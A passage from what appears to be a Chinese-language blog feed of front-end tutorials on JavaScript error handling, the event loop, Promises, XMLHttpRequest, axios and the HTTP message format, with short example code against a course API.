href="#错误捕获" class="headerlink" title="错误捕获"></a>错误捕获</h2><p><strong>使用</strong>：<code>try...catch</code>语句标记要尝试的语句块，并指定一个出现异常时抛出的响应</p><p><strong>语法</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// 要执行的async函数</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line"><span class="comment">// error接收错误的信息</span></span><br><span class="line"><span class="comment">// 当try部分出现错误，则会在这里执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="事件循环（EventLoop）"><a href="#事件循环（EventLoop）" class="headerlink" title="事件循环（EventLoop）"></a>事件循环（EventLoop）</h1><p><strong>概念</strong>：JavaScript有一个基于事件循环的并发模型，事件循环负责执行代码、收集和处理事件以及执行队列中的子任务。这个模型与其他语言中的模型截然不同，比如C和Java。</p><p><strong>原因</strong>：JavaScript是单线程，为了让耗时代码不阻塞其他代码运行，设计了事件循环模型</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230222182338992.png" alt="image-20230222182338992.png"></p><p><strong>事件循环机制</strong>：</p><ol><li>代码执行时，先执行同步任务，然后将异步任务放入任务队列中，等待执行。  </li><li>当所有同步任务执行完毕后，JavaScript引擎会去读取任务队列中的任务。  </li><li>将队列中的第一个任务压入执行栈中执行，执行完毕后将其出栈。  </li><li>如此循环执行，直到任务队列中的所有任务都执行完毕。</li></ol><p>用一个例子再次模拟一下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>) <span class="comment">// 同步任务，直接执行</span></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>)  <span class="comment">// 延时器，属于异步任务，即使只是延时0ms</span></span><br><span class="line">&#125;, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">myFn</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">3</span>)  <span class="comment">// 同步任务，在被调用的时候直接执行</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ajaxFn</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>()</span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://hmajax.itheima.net/api/province&#x27;</span>)</span><br><span class="line">xhr.<span class="title function_">addEventListener</span>(<span class="string">&#x27;loadend&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">4</span>)  <span class="comment">// xhr网络请求，属于异步任务</span></span><br><span class="line">&#125;)</span><br><span class="line">xhr.<span class="title function_">send</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">1</span>; i++) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span>)  <span class="comment">// 同步任务，进入for循环直接执行</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">ajaxFn</span>()</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.btn&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">6</span>)  <span class="comment">// 事件监听，属于异步任务，需要同步任务执行完毕之后按下按钮才可触发</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="title function_">myFn</span>()</span><br></pre></td></tr></table></figure><ul><li>结果为1、5、3、2、4，按下按钮打印 6。</li></ul><h2 id="宏任务与微任务"><a href="#宏任务与微任务" class="headerlink" title="宏任务与微任务"></a>宏任务与微任务</h2><p>宏任务（MacroTasks）和微任务（Micro Tasks）是指在JavaScript中异步任务队列中执行的不同类型任务。</p><p>ES6 之后引入了 Promise 对象， 让 JS 引擎也可以发起异步任务</p><p><strong>异步任务</strong>划分为了</p><ul><li>宏任务：由浏览器环境执行的异步代码</li><li>微任务：由 JS 引擎环境执行的异步代码</li></ul><p>宏任务和微任务具体划分：</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230222184920343.png" alt="image-20230222184920343.png"></p><p>宏任务每次在执行同步代码时，产生微任务队列，<strong>清空</strong>微任务队列任务后，微任务队列空间释放！</p><p>下一次宏任务执行时，遇到微任务代码，才会再次申请微任务队列空间放入回调函数消息排队</p><p>总结：一个宏任务包含微任务队列，他们之间是<strong>包含关系</strong>，不是并列关系</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230222184949605.png" alt="image-20230222184949605.png"></p><h2 id="事件循环-经典面试题"><a href="#事件循环-经典面试题" class="headerlink" title="事件循环-经典面试题"></a>事件循环-经典面试题</h2><p>关于事件循环的经典面试题，根据代码回答打印顺序</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240314160705.png" alt="image.png"></p><ul><li>答案是1、7、5、6、2、3、4</li></ul><p><strong>执行顺序</strong>：</p><ol><li>第一行的<code>console.log(1)</code>为同步操作，进入调用栈，直接执行，<strong>打印1</strong></li><li>第二部分<code>setTimeout()</code>为异步操作，进入浏览器宿主环境，因为是延时0ms，所以直接进入宏任务队列，等待执行</li><li>第三部分新的<code>Promise()</code>对象，因为Promise本身是同步操作，所以会执行，内部的<code>setTimeout()</code>为异步，与上面的一致，所以进入宏任务队列，<code>resolve(5)</code>执行</li><li>第四部分<code>p.then()</code>为异步操作，进入微任务队列，等待执行</li><li>第五部分p2创建新的<code>Promise()</code>对象，<code>resolve(6)</code>执行，<code>p2.then()</code>是异步操作，进入微任务队列</li><li>最后的<code>console.log(7)</code>为同步任务，直接执行，<strong>打印7</strong></li><li>当前调用栈的所以任务已经执行完毕，接下来先执行微任务队列，执行第四部分的<code>p.then()</code>，因为<code>resolve</code>传入的是<code>5</code>，所以<code>console.log(result)</code>执行<strong>打印5</strong></li><li>接下来继续执行微任务队列，执行第五部分的<code>p2.then()</code>，同理<strong>打印6</strong></li><li>微任务队列执行完毕，开始执行宏任务队列，执行第二部分的<code>setTimeout()</code>，这个函数内部的<code>console.log(2)</code>为同步任务，所以直接执行，<strong>打印2</strong>，后面的<code>p.then()</code>再次进入微任务队列</li><li>当前微任务队列有一个任务，所以先执行微任务，另外的宏任务继续等待，微任务第二部分<code>setTimeout()</code>当中的<code>p.then()</code>执行，<strong>打印3</strong></li><li>最后微任务队列执行完毕，开始执行宏任务队列的最后一个任务，第三部分<code>Promise()</code>内部的<code>setTimeout()</code>，<strong>打印4</strong></li></ol><h1 id="Promise-all-静态方法"><a href="#Promise-all-静态方法" class="headerlink" title="Promise.all 静态方法"></a>Promise.all 静态方法</h1><p><strong>概念</strong>：合并多个 Promise 对象，等待所有同时成功完成（或某一个失败），做后续逻辑</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230222190117045.png" alt="image-20230222190117045.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="title class_">Promise</span>.<span class="title function_">all</span>([<span class="title class_">Promise</span>对象, <span class="title class_">Promise</span>对象, ...])</span><br><span class="line">p.<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// result 结果: [Promise对象成功结果, Promise对象成功结果, ...]</span></span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 第一个失败的 Promise 对象，抛出的异常对象</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> AJAX </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> ajax </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AJAX-原理</title>
      <link href="/2024/03/13/AJAX-%E5%8E%9F%E7%90%86/"/>
      <url>/2024/03/13/AJAX-%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="XMLHttpRequest"><a href="#XMLHttpRequest" class="headerlink" title="XMLHttpRequest"></a>XMLHttpRequest</h1><p><strong>定义</strong>：XMLHttpRequest（XHR）对象用于与服务器交互。通过XMLHttpRequest可以在不刷新页面的情况下请求特定URL，获取数据。这允许网页在不影响用户操作的情况下，更新页面的局部内容。XMLHttpRequest在AJAX编程中被大量使用</p><p><strong>关系</strong>：axios内部采用XMLHttpRequest与服务器交互</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230221182835545.png" alt="image-20230221182835545.png"></p><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><ol><li>创建 XMLHttpRequest 对象 </li><li>配置<strong>请求方法</strong>和请求 <strong>url 地址</strong> </li><li>监听 loadend 事件，<strong>接收响应结果</strong> </li><li><strong>发起请求</strong></li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230221183057392.png" alt="image-20230221183057392.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>()</span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://hmajax.itheima.net/api/province&#x27;</span>)</span><br><span class="line">xhr.<span class="title function_">addEventListener</span>(<span class="string">&#x27;loadend&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(xhr.<span class="property">response</span>)</span><br><span class="line"><span class="keyword">const</span> data = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(xhr.<span class="property">response</span>)</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.city&#x27;</span>).<span class="property">innerHTML</span> = data.<span class="property">list</span>.<span class="title function_">join</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line">xhr.<span class="title function_">send</span>()</span><br></pre></td></tr></table></figure><h2 id="查询参数"><a href="#查询参数" class="headerlink" title="查询参数"></a>查询参数</h2><p><strong>定义</strong>：浏览器提供给服务器的额外信息，让服务器返回浏览器想要的数据 </p><p><strong>语法</strong>：<code>http://xxxx.com/xxx/xxx?参数名1=值1&amp;参数名2=值2</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>()</span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://hmajax.itheima.net/api/city?pname=广东省&#x27;</span>)</span><br><span class="line">xhr.<span class="title function_">addEventListener</span>(<span class="string">&#x27;loadend&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(xhr.<span class="property">response</span>)</span><br><span class="line"><span class="keyword">const</span> data = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(xhr.<span class="property">response</span>)</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.city&#x27;</span>).<span class="property">innerHTML</span> = data.<span class="property">list</span>.<span class="title function_">join</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line">xhr.<span class="title function_">send</span>()</span><br></pre></td></tr></table></figure><h2 id="数据提交"><a href="#数据提交" class="headerlink" title="数据提交"></a>数据提交</h2><p><strong>需求</strong>：通过 XHR 提交用户名和密码，完成注册功能 </p><p><strong>核心</strong>：<br>    请求头设置 <code>Content-Type</code>：<code>application/json</code><br>    请求体携带 JSON 字符串</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>()</span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;http://hmajax.itheima.net/api/register&#x27;</span>)</span><br><span class="line">xhr.<span class="title function_">addEventListener</span>(<span class="string">&#x27;loadend&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(xhr.<span class="property">response</span>)</span><br><span class="line">&#125;)</span><br><span class="line">xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/json&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> user = &#123;</span><br><span class="line"><span class="attr">username</span>: <span class="string">&#x27;Alien12345&#x27;</span>,</span><br><span class="line"><span class="attr">password</span>: <span class="string">&#x27;123456789&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> userStr = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user)</span><br><span class="line">xhr.<span class="title function_">send</span>(userStr)</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240313221858.png" alt="image.png"></p><h1 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h1><p><strong>定义</strong>：<code>Promise</code> 对象用于表示一个异步操作的最终完成（或失败）及其结构值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 创建 Promise 对象</span></span><br><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line"> <span class="comment">// 2. 执行异步任务-并传递结果</span></span><br><span class="line"> <span class="comment">// 成功调用: resolve(值) 触发 then() 执行</span></span><br><span class="line"> <span class="comment">// 失败调用: reject(值) 触发 catch() 执行</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 3. 接收结果</span></span><br><span class="line">p.<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line"> <span class="comment">// 成功</span></span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line"> <span class="comment">// 失败</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>好处</strong>：</p><ol><li>逻辑更清晰</li><li>了解axios函数内部运作机制</li><li>能解决回调函数地狱问题</li></ol><h2 id="Promise-三种状态"><a href="#Promise-三种状态" class="headerlink" title="Promise-三种状态"></a>Promise-三种状态</h2><p><strong>作用</strong>：了解<code>Promise</code>对象如何关联的处理函数，以及代码执行顺序 </p><p><strong>概念</strong>：一个<code>Promise</code>对象，必然处于以下几种状态之一 </p><ul><li>待定（pending） ：初始状态，既没有被兑现，也没有被拒绝</li><li>已兑现（fulfilled） ：意味着，操作成功完成</li><li>已拒绝（rejected） ：意味着，操作失败</li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230222120815484.png" alt="image-20230222120815484.png"></p><ul><li>当<code>Promise</code>对象一旦被兑现&#x2F;拒绝，就是被敲定，状态无法再被改变</li></ul><h1 id="封装简易axios"><a href="#封装简易axios" class="headerlink" title="封装简易axios"></a>封装简易axios</h1><p>了解封装axios的原理，可以更好地理解XMLHttpRequest原理和axios的用法</p><p><strong>步骤</strong>： </p><ol><li>定义 <code>myAxios</code> 函数，接收配置对象，返回 <code>Promise</code> 对象 </li><li>发起 XHR 请求，默认请求方法为 <code>GET</code> </li><li>调用成功&#x2F;失败的处理程序 </li><li>使用 <code>myAxios</code> 函数，发起网络请求</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 定义简易axios函数，接收配置对象，返回promise对象</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">myAxios</span>(<span class="params">config</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="comment">// 2. 发起XHR请求</span></span><br><span class="line"><span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>()</span><br><span class="line">xhr.<span class="title function_">open</span>(config.<span class="property">method</span> || <span class="string">&#x27;GET&#x27;</span>, config.<span class="property">url</span>) <span class="comment">// 获取请求方法，默认GET</span></span><br><span class="line">xhr.<span class="title function_">addEventListener</span>(<span class="string">&#x27;loadend&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="comment">// 3. 调用成功/失败的处理程序</span></span><br><span class="line"><span class="keyword">if</span> (xhr.<span class="property">status</span> &gt;= <span class="number">200</span> &amp;&amp; xhr.<span class="property">status</span> &lt; <span class="number">300</span>) &#123;</span><br><span class="line"><span class="title function_">resolve</span>(<span class="title class_">JSON</span>.<span class="title function_">parse</span>(xhr.<span class="property">response</span>))</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(xhr.<span class="property">response</span>))</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">xhr.<span class="title function_">send</span>()</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 执行简易axios</span></span><br><span class="line"><span class="title function_">myAxios</span>(&#123;</span><br><span class="line"><span class="attr">url</span>: <span class="string">&#x27;目标资源地址&#x27;</span></span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> AJAX </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> ajax </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AJAX-入门</title>
      <link href="/2024/03/13/AJAX-%E5%85%A5%E9%97%A8/"/>
      <url>/2024/03/13/AJAX-%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="AJAX概念和axios使用"><a href="#AJAX概念和axios使用" class="headerlink" title="AJAX概念和axios使用"></a>AJAX概念和axios使用</h1><h2 id="AJAX概念"><a href="#AJAX概念" class="headerlink" title="AJAX概念"></a>AJAX概念</h2><ul><li>使用浏览器的 XMLHttpRequest 对象 与服务器通信</li><li>浏览器网页中，使用 AJAX技术（XHR对象）发起获取省份列表数据的请求，服务器代码响应准备好的省份列表数据给前端，前端拿到数据数组以后，展示到网页</li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230403173156484.png" alt="image-20230403173156484.png"></p><h2 id="axios使用"><a href="#axios使用" class="headerlink" title="axios使用"></a>axios使用</h2><p><strong>语法</strong>：</p><ol><li>引入<code>axios.js</code>：<a href="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js">https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js</a></li><li>使用axios函数<ul><li>传入配置对象</li><li>再用<code>.then</code>回调函数接收结果，并做后续处理</li></ul></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">axios</span>(&#123;</span><br><span class="line"><span class="attr">url</span>: <span class="string">&#x27;http://hmajax.itheima.net/api/province&#x27;</span> <span class="comment">// 目标资源地址</span></span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="comment">// 对服务器返回的数据做后续处理</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="URL查询参数"><a href="#URL查询参数" class="headerlink" title="URL查询参数"></a>URL查询参数</h1><p>定义：浏览器提供给服务器的额外信息，让服务器返回浏览器想要的数据</p><p>语法：<code>http://xxxx.com/xxx/xxx?参数名1=值1&amp;参数名2=值2</code></p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230404101257205.png" alt="image-20230404101257205.png"></p><h3 id="axios-查询参数"><a href="#axios-查询参数" class="headerlink" title="axios-查询参数"></a>axios-查询参数</h3><p><strong>语法</strong>：使用 axios 提供的 params 选项 </p><p><strong>注意</strong>：axios 在运行时把参数名和值，会拼接到 <code>url?参数名=值</code></p><p><strong>城市列表</strong>：<code>http://hmajax.itheima.net/api/city?pname=河北省</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">axios</span>(&#123;</span><br><span class="line"><span class="attr">url</span>: <span class="string">&#x27;http://hmajax.itheima.net/api/city&#x27;</span>,</span><br><span class="line"><span class="attr">params</span>: &#123;</span><br><span class="line"><span class="attr">pname</span>: <span class="string">&#x27;广东省&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="comment">// 对服务器返回的数据做后续处理</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result)</span><br><span class="line"><span class="comment">// console.log(result.data.list)</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.city&#x27;</span>).<span class="property">innerHTML</span> = result.<span class="property">data</span>.<span class="property">list</span>.<span class="title function_">join</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240313202036.png" alt="image.png"></p><h1 id="常用请求方法和数据提交"><a href="#常用请求方法和数据提交" class="headerlink" title="常用请求方法和数据提交"></a>常用请求方法和数据提交</h1><p><strong>请求方法</strong>：对服务器资源，要执行的操作</p><table><thead><tr><th>请求方法</th><th>操作</th></tr></thead><tbody><tr><td><strong>GET</strong></td><td>获取数据</td></tr><tr><td><strong>POST</strong></td><td>数据提交</td></tr><tr><td>PUT</td><td>修改数据（全部）</td></tr><tr><td>DELETE</td><td>删除数据</td></tr><tr><td>PATCH</td><td>修改数据（部分）</td></tr></tbody></table><p><strong>数据提交</strong>：当数据需要在服务器上保存时</p><h2 id="axios请求配置"><a href="#axios请求配置" class="headerlink" title="axios请求配置"></a>axios请求配置</h2><p><code>url</code>：请求的URL地址</p><p><code>method</code>：请求的方法，GET可以省略（不区分大小写）</p><p><code>data</code>：提交数据</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">axios</span>(&#123;</span><br><span class="line"><span class="attr">url</span>: <span class="string">&#x27;http://hmajax.itheima.net/api/register&#x27;</span>,</span><br><span class="line"><span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line"><span class="attr">data</span>: &#123;</span><br><span class="line"><span class="attr">username</span>: <span class="string">&#x27;M78Alien&#x27;</span>,</span><br><span class="line"><span class="attr">password</span>: <span class="string">&#x27;123456789&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="axios错误处理"><a href="#axios错误处理" class="headerlink" title="axios错误处理"></a>axios错误处理</h1><p><strong>场景</strong>：再次注册相同的账号，会遇到报错信息</p><p><strong>处理</strong>：用更直观的方式，给普通用户展示错误信息</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">axios</span>(&#123;</span><br><span class="line"><span class="attr">url</span>: <span class="string">&#x27;http://hmajax.itheima.net/api/register&#x27;</span>,</span><br><span class="line"><span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line"><span class="attr">data</span>: &#123;</span><br><span class="line"><span class="attr">username</span>: <span class="string">&#x27;M78Alien&#x27;</span>,</span><br><span class="line"><span class="attr">password</span>: <span class="string">&#x27;123456789&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result) <span class="comment">// 因为上面注册过相同的账号密码，所以会返回错误信息</span></span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(error)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240313203722.png" alt="image.png"></p><h1 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h1><p><strong>HTTP协议</strong>：规定了浏览器发送及服务器返回内容的格式</p><h2 id="请求报文"><a href="#请求报文" class="headerlink" title="请求报文"></a>请求报文</h2><p><strong>请求报文</strong>：浏览器按照 HTTP 协议要求的格式，发送给服务器的内容</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230220132229960.png" alt="image-20230220132229960.png"><br><strong>请求报文的组成部分有</strong>：</p><ol><li>请求行：请求方法，URL，协议</li><li>请求头：以键值对的格式携带的附带信息，比如：<code>Content-Type</code></li><li>空行：分隔请求头，空行之后的是发送给服务器的资源</li><li>请求体：发送的资源</li></ol><h2 id="响应报文"><a href="#响应报文" class="headerlink" title="响应报文"></a>响应报文</h2><p><strong>响应报文</strong>：服务器按照 HTTP 协议要求的格式，返回给浏览器的内容</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230220133141151.png" alt="image-20230220133141151.png"></p><p><strong>响应报文组成部分</strong>：</p><ol><li>响应行（状态行）：协议、HTTP 响应状态码、状态信息 </li><li>响应头：以键值对的格式携带的附加信息，比如：<code>Content-Type</code> 